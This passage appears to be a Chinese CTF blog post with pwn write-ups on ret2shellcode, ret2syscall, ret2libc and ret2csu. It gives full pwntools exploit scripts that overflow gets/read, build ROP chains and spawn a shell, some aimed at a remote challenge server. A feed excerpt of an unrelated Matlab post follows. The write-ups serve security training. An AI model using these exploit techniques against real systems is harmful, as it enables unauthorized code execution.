<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode		<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x08048593	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png" alt="image-20220616190029416" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcef0          </span><br><span class="line">ebp            0xffffcf78   </span><br><span class="line">s=esp+0x1c=ffffcf0c</span><br><span class="line">s相对于esp的偏移：ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数造成栈溢出修改返回地址为buf2的地址，在s中填充shellcode(需要填满，空余的用其他垃圾数据填充)</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试的相关信息</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)					<span class="comment">#远程访问</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)						#本地访问，这题不知道为啥打不通</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2shellcode&#x27;)							#导入文件</span></span><br><span class="line"></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment">#调用系统函数自动生成</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>								<span class="comment">#buf2的地址，让返回地址修改为这个</span></span><br><span class="line"></span><br><span class="line">payload=shellc.ljust(<span class="number">0x6c</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)	<span class="comment">#构造payload</span></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程交互</span></span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png" alt="image-20220617165203505" style="zoom:80%;" />



<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png" alt="image-20220616194848607" style="zoom:80%;" />

<p>32位，开启了NX保护</p>
<p>ida查看程序文件</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png" alt="image-20220617102809148" style="zoom:80%;" />

<p>看到了危险函数gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png" alt="image-20220617105411878" style="zoom:80%;" />

<p>跟前面一样，动调算一下偏移值</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png" alt="image-20220617105536928" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf30         </span><br><span class="line">ebp            0xffffcfb8 </span><br><span class="line">v4---&gt;esp+0x1c=0xffffcf4c</span><br><span class="line">v4相对于ebp偏移---&gt;offset=0x6c</span><br><span class="line">因为是32位，故v4相对于返回地址的偏移---&gt;0x6c+4</span><br></pre></td></tr></table></figure>

<p>可以利用系统调用来获取shell，比较常用的是下面这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>

<p>对于对应的参数，可以借鉴这个网站：<a href="https://publicki.top/old/syscall.html">https://publicki.top/old/syscall.html</a></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png" alt="image-20220617112104732" style="zoom:80%;" />

<p>使用ROPgadget查找gadgets</p>
<p>eax的gadgets</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png" alt="image-20220617160518058" style="zoom:80%;" />

<p>使用我选中的那一行可以直接对ebx、ecx、edx进行赋值</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png" alt="image-20220617160816757" style="zoom:80%;" />

<p>&#x2F;bin&#x2F;sh这个字符串的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png" alt="image-20220617161022248" style="zoom:80%;" />

<p>int 0x80的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png" alt="image-20220617161107749" style="zoom:80%;" />

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#之前计算的需要填充的偏移</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span>									<span class="comment">#eax,ret</span></span><br><span class="line">pop_e3x=<span class="number">0x0806eb90</span>									<span class="comment">#edx,ecx,ebx,ret</span></span><br><span class="line">bin_sh=<span class="number">0x080be408</span>									<span class="comment">#/bin/sh				</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span>									<span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(pop_eax)+p32(<span class="number">0x0b</span>)+p32(pop_e3x)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)										   <span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png" alt="image-20220617165348158" style="zoom:80%;" />



<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png" alt="image-20220617202842455" style="zoom:80%;" />

<p>32位，开启NX检查</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png" alt="image-20220617203134019" style="zoom:80%;" />

<p>查看调用了的一些函数，可以看到gets、system函数</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png" alt="image-20220617203657889" style="zoom: 80%;" />

<p>发现可以造成溢出的gets寒素</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png" alt="image-20220617203738980" style="zoom:80%;" />

<p>在plt表中可以看到调用了system函数(在初始页面按ctrl+s选择plt表跳转)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png" alt="image-20220617204005123" style="zoom:80%;" />

<p>在查看字符串的时候(shift+f12)，发现字符串&#x2F;bin&#x2F;sh</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png" alt="image-20220617204301525" style="zoom:80%;" />

<p>现在整理一下可以利用的东西：可以造成溢出的gets函数、系统调用函数system以及字符串&#x2F;bin&#x2F;sh</p>
<p>除了可以通过ida直接查看字符串的地址，还可以通过ROPgadget</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png" alt="image-20220617205228929" style="zoom:80%;" />



<p>计算s和返回地址的偏移(方法和前面一样)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png" alt="image-20220617204730342" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf10       </span><br><span class="line">ebp            0xffffcf98</span><br><span class="line"></span><br><span class="line">s:esp+0x1c=0xffffcf2c</span><br><span class="line">s相对于ebp的偏移：offset=ebp-s=0x6c</span><br><span class="line">s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数的栈溢出修改返回地址并使之执行system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#需要填充的垃圾数据</span></span><br><span class="line">bin_sh=<span class="number">0x08048720</span>									<span class="comment">#先前查询的地址</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]						<span class="comment">#可以使用pwntools库中的函数直接查找，也可以像下面这样把ida中找到的直接写出来</span></span><br><span class="line"><span class="comment">#system=0x08048460</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)	<span class="comment">#构造payload，中间加了b&#x27;bbbb&#x27;是因为在调用函数的时候，同时需要一个对应的返回地址，这里的b&#x27;bbbb&#x27;作为虚假的地址，因为此时已经拿到了shell</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png" alt="image-20220617210035884" style="zoom:80%;" />



<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png" alt="image-20220617210220822" style="zoom:80%;" />

<p>和例1一样，32位，开启NX保护</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png" alt="image-20220617210500398" style="zoom:80%;" />

<p>可以造成栈溢出的gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png" alt="image-20220617212503114" style="zoom:80%;" />

<p>查看字符串(shift+f12)，和第一题相比，可以看到没有了字符串&#x2F;bin&#x2F;sh</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png" alt="image-20220617210556495" style="zoom:80%;" />

<p>在plt表中可以找到system函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png" alt="image-20220617211320710" style="zoom:80%;" />

<p>在bss段可以找到一个连续的空间，并且动调发现bss段可执行</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png" alt="image-20220617211915506" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png" alt="image-20220617211848614" style="zoom:80%;" />

<p>计算s和返回地址的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x13                19</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x80486ba           0x80486ba &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>

<p><strong>攻击思路</strong></p>
<p>和例1很像，不过缺少字符串&#x2F;bin&#x2F;sh，故可以调用gets函数把字符串&#x2F;bin&#x2F;sh写道bss段上，然后修改返回地址执行system(“&#x2F;bin&#x2F;sh”)</p>
<p>buf2的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png" alt="image-20220617214054803" style="zoom:80%;" />

<p>pop_ebx</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png" alt="image-20220617214223568" style="zoom:80%;" />



<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)							</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>						</span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]					<span class="comment">#可以这样直接调用函数，也可以在ida中查</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]				<span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(gets_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(buf2_addr)								<span class="comment">#这里的pop主要是为了返回用的进而执行system函数</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>关于payloa的构造，wiki上面没有详细说明，为了方便理解，画了一张流程图</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png" alt="ret2libc2_01" style="zoom:80%;" />

<p>我先开始也看不太明白，请教了高师傅后才理解的，后来高师傅还给我推荐了一个构造payload的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure>

<p>这个在栈上的分布如下图所示</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png" alt="image-20220617224122737" style="zoom:80%;" />

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png" alt="image-20220617221719649" style="zoom:80%;" />



<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png" alt="image-20220618102115483" style="zoom:80%;" />

<p>32位，开启NX保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png" alt="image-20220618102235365" style="zoom:80%;" />

<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png" alt="image-20220618102436248" style="zoom:80%;" />

<p>发现危险函数gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png" alt="image-20220618102526005" style="zoom:80%;" />

<p>计算s和返回地址的偏移(方法和之前一样)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x12                18</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x804868a           0x804868a &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:offset=ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>

<p>程序中可以利用的最明显的就是gets函数的溢出。</p>
<p><strong>攻击思路</strong></p>
<p>利用gets函数的溢出泄露出libc版本，进而获取到system地址和&#x2F;bin&#x2F;sh地址，再次执行程序出发栈溢出执行system(“&#x2F;bin&#x2F;sh”)</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2libc3&#x27;)							#我得本地打不出来，应该和Ubuntu版本有关</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#利用puts函数打印出需要打印的函数的got地址</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#随便选取一个libc库中调用的函数即可，我这里选的是puts的	</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment">#main函数地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(puts_plt)+p32(main)+p32(puts_got)	<span class="comment">#构造payload，这里修改返回调用为puts(puts_got)，puts函数的返回地址为主函数，方便泄露完成后构造shellc获取shell</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])			<span class="comment">#一般got地址是以\xf7开头，也可以像网上那样写，如下</span></span><br><span class="line"><span class="comment">#puts_addr=u32(sh.recv()[0:4])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))		<span class="comment">#打印出来看看</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)					<span class="comment">#利用库查找出libc</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>当使用LibcSearcher查询不到时候(好像是版本的问题打不出来)，可以到网上去在线查询，输入相关的函数的地址(后3位即可)，在线查询网：<a href="https://publicki.top/libc/">https://publicki.top/libc/</a> 或者 <a href="https://libc.rip/">https://libc.rip/</a></p>
<p>本地没pwn掉应该是因为我用的是Ubuntu20的版本问题</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png" alt="image-20220618125557365" style="zoom:80%;" />

<p>但是远程可以打通的</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />



<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>借鉴的博客：<a href="https://blog.csdn.net/AcSuccess/article/details/104448463">https://blog.csdn.net/AcSuccess/article/details/104448463</a></p>
<p>检查保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202733545.png" alt="image-20220618202733545" style="zoom:80%;" />

<p>64位，开启了NX保护，即堆栈段不可执行</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202819738.png" alt="image-20220618202819738" style="zoom:80%;" />

<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210224594.png" alt="image-20220618210224594" style="zoom:80%;" />

<p>调用的函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210302293.png" alt="image-20220618210302293" style="zoom:80%;" />

<p>可以看到read函数存在栈溢出，因为buf的字长是128，而读入的数据长度是0x200。</p>
<p>程序中没有system函数的调用，也没有字符串&#x2F;bin&#x2F;sh，故两个都需要自己去构造</p>
<p><strong>攻击思路</strong></p>
<p>1、利用栈溢出执行 libc_csu_gadgets 获取 read 函数地址，并使得程序重新执行 main 函数</p>
<p>2、根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</p>
<p>3、再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘&#x2F;bin&#x2F;sh’ 地址，并使得程序重新执行 main 函数。</p>
<p>4、再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘&#x2F;bin&#x2F;sh’) 获取 shell。</p>
<p>这题ctf-wiki讲的不是很详细，我上网找了找相关的题解，除了借鉴的博客，<a href="https://wiki.wgpsec.org/knowledge/ctf/ret2csu.html">狼组安全的文库</a>对这个题型进行了详细的讲解</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level5&#x27;)							#我的本地没有打出来，应该是环境的问题</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">128</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">first_csu=<span class="number">0x400606</span></span><br><span class="line">second_csu=<span class="number">0x4005f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12,r13,r14,r15,last</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p64(first_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(second_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x0000000000400460</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload=ret_csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">payload=ret_csu(read_got,<span class="number">0</span>,bss_addr,<span class="number">18</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line">io.sendline(p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=ret_csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220619213844860.png" alt="image-20220619213844860" style="zoom:80%;" />

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(01)Matlab基础知识</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8801%EF%BC%89%E3%80%90Matlab%E3%80%91Matlab%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="A-MATLAB系统环境"><a href="#A-MATLAB系统环境" class="headerlink" title="A MATLAB系统环境"></a>A MATLAB系统环境</h1><h2 id="A-a-MATLAB操作界面的组成"><a href="#A-a-MATLAB操作界面的组成" class="headerlink" title="A.a MATLAB操作界面的组成"></a>A.a MATLAB操作界面的组成</h2><p>1 Matlab主窗口<br><img src="https://img-blog.csdnimg.cn/20200225164148733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>功能区：提供三个选项卡（主页，绘图，应用程序），各自有不同的工具可供使用。</li>
